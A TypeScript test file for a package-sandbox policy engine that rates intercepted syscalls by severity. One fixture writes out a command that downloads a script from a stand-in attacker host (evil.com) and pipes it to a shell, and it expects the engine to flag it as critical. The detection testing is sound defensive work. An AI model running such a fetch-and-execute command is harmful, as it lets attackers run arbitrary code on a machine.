import { evaluateEvents } from './engine'
import { SandboxEvent, Verdict } from './types'

describe('Policy Engine', () => {
  it('should detect CRITICAL severity for remote code execution', () => {
    const events: SandboxEvent[] = [{
      event: 'syscall_intercepted',
      package: 'malicious-pkg@1.0.0',
      syscall: 'execve',
      args: ['/bin/sh', ['-c', 'curl http://evil.com/steal.sh | bash']],
      path: undefined,
      action: 'blocked' as const,
      timestamp_ns: 1746547200000
    }]

    const verdict: Verdict = evaluateEvents(events, 'malicious-pkg', '1.0.0')
    expect(verdict.severity).toBe('CRITICAL')
    expect(verdict.findings).toHaveLength(1)
    expect(verdict.findings[0].message).toContain('remote code')
  })

  it('should detect HIGH severity for outbound network', () => {
    const events: SandboxEvent[] = [{
      event: 'syscall_intercepted',
      package: 'some-pkg@1.0.0',
      syscall: 'connect',
      args: { addr: '185.220.101.47:443' },
      path: undefined,
      action: 'blocked' as const,
      timestamp_ns: 1746547200000
    }]

    const verdict = evaluateEvents(events, 'some-pkg', '1.0.0')
    expect(verdict.severity).toBe('HIGH')
  })

  it('should return INFO if no rules match', () => {
    const events: SandboxEvent[] = [{
      event: 'fs_read',
      package: 'legit-pkg@1.0.0',
      path: '/tmp/somefile',
      action: 'allowed' as const,
      timestamp_ns: 1746547200000
    }]

    const verdict = evaluateEvents(events, 'legit-pkg', '1.0.0')
    expect(verdict.severity).toBe('INFO')
    expect(verdict.findings).toHaveLength(0)
  })
})
